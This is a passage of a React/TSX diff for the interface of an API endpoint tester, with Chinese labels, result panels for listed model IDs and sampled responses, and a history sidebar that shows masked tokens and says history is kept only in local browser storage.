+                    {(modelsState.data?.data || []).slice(0, 10).map((item: any) => (
+                      <button
+                        key={item.id}
+                        onClick={() => {
+                          navigator.clipboard.writeText(item.id).then(() => {
+                            window.showToast?.(`模型 ID [${item.id}] 已复制`, 'success');
+                          });
+                        }}
+                        title="点击复制模型 ID"
+                        className="px-1.5 py-0.5 rounded-md bg-[var(--bg-main)] border border-[var(--border-color)] text-[9px] font-mono hover:border-[var(--accent-color)] hover:text-[var(--accent-color)] transition-all active:scale-95 cursor-pointer"
+                      >
+                        {item.id}
+                      </button>
+                    ))}
+                    {(modelsState.data?.data || []).length > 10 && <span className="text-[9px] opacity-40 italic py-0.5">+{(modelsState.data?.data || []).length - 10} more</span>}
+                  </div>
+                </div>
+              )}
+            </ResultPanel>
+
+            <ResultPanel state={chatState}>
+              {chatState.status === 'success' && (
+                <div className="mt-4 pt-4 border-t border-[var(--border-color)]/40 group relative">
+                  <div className="text-[10px] text-[var(--text-secondary)] mb-2 uppercase tracking-tighter opacity-60">采样响应内容</div>
+                  <div className="rounded-xl border border-[var(--border-color)] bg-[var(--bg-main)]/50 p-3 text-[11px] leading-relaxed line-clamp-4 hover:line-clamp-none transition-all">
+                    {extractTextFromResponse(chatState.data)}
+                  </div>
+                </div>
+              )}
+            </ResultPanel>
+
+            <ResultPanel state={responsesState}>
+              {(responsesState.status === 'success' || responsesState.status === 'warning') && (
+                <div className="mt-4 pt-4 border-t border-[var(--border-color)]/40">
+                   <div className="text-[10px] text-[var(--text-secondary)] mb-2 uppercase tracking-tighter opacity-60">端点可用性</div>
+                   <div className={`rounded-xl border ${responsesState.status === 'success' ? 'border-emerald-500/20 bg-emerald-500/5' : 'border-amber-500/20 bg-amber-500/5'} p-3 text-[10px] leading-relaxed`}>
+                     {responsesState.status === 'success' ? '标准 Responses 端点响应正常' : '端点返回异常，建议确认兼容模式'}
+                   </div>
+                </div>
+              )}
+            </ResultPanel>
           </div>
         </div>
-      </aside>
+
+        {/* 右侧边栏：历史记录与辅助功能 */}
+        <div className="lg:col-span-4 flex flex-col gap-6">
+          <aside className="h-full flex flex-col rounded-[32px] border border-[var(--border-color)] bg-[var(--bg-surface)] overflow-hidden shadow-xl">
+            <div className="p-6 border-b border-[var(--border-color)]/60 bg-[var(--bg-main)]/30">
+              <div className="flex items-center justify-between mb-2">
+                <h3 className="text-sm font-bold flex items-center gap-2 tracking-tight">
+                  <History className="w-4 h-4 text-[var(--accent-color)]" />
+                  测试历史
+                </h3>
+                {!historyEmpty && (
+                  <button
+                    onClick={clearHistory}
+                    className="text-[10px] font-bold text-[var(--text-secondary)] hover:text-red-500 transition-colors uppercase tracking-widest"
+                  >
+                    清空历史
+                  </button>
+                )}
+              </div>
+              <div className="mt-4 flex gap-3 p-3 rounded-2xl bg-amber-500/5 border border-amber-500/10">
+                <ShieldAlert className="w-3.5 h-3.5 text-amber-500 shrink-0 mt-0.5" />
+                <p className="text-[9px] text-[var(--text-secondary)] leading-relaxed opacity-80 font-medium">
+                  我们深知数据隐私的重要性，历史记录仅存储在当前浏览器的本地存储中，不会上传至任何服务器。
+                </p>
+              </div>
+            </div>
+
+            <div className="flex-1 overflow-y-auto custom-scrollbar py-2">
+              {historyEmpty ? (
+                <div className="h-40 flex flex-col items-center justify-center text-[var(--text-secondary)] opacity-20 px-10 text-center">
+                  <History className="w-10 h-10 mb-2" />
+                  <p className="text-[10px] font-medium">还没有任何历史记录</p>
+                </div>
+              ) : (
+                <div className="px-3 space-y-2">
+                  {history.map((item) => (
+                    <button
+                      key={`${item.url}-${item.token}-${item.timestamp}`}
+                      onClick={() => loadHistory(item)}
+                      className="w-full text-left rounded-[20px] border border-[var(--border-color)] p-4 bg-[var(--bg-main)]/40 hover:bg-[var(--hover-color)] hover:border-[var(--accent-color)]/30 transition-all group relative overflow-hidden"
+                    >
+                      <div className="relative z-10">
+                        <p className="text-[11px] font-bold text-[var(--text-primary)] truncate max-w-[180px] mb-1">{item.url}</p>
+                        <div className="flex items-center justify-between">
+                           <span className="text-[9px] font-mono text-[var(--text-secondary)]">{maskToken(item.token)}</span>
+                           <span className="text-[9px] text-[var(--text-secondary)] opacity-50">{new Date(item.timestamp).toLocaleDateString()}</span>
+                        </div>
+                      </div>
+                      <div className="absolute top-1/2 -translate-y-1/2 right-3 opacity-0 group-hover:opacity-100 transition-all">
+                        <button 
+                           onClick={(e) => { e.stopPropagation(); removeHistory(item); }}
+                           className="p-1.5 rounded-lg bg-red-500 text-white shadow-lg shadow-red-500/20"
+                        >
+                          <Trash2 className="w-3 h-3" />
+                        </button>
+                      </div>
+                    </button>
+                  ))}
+                </div>
+              )}
+            </div>
+
+
+          </aside>
+        </div>
+      </div>
     </div>
   );
 }
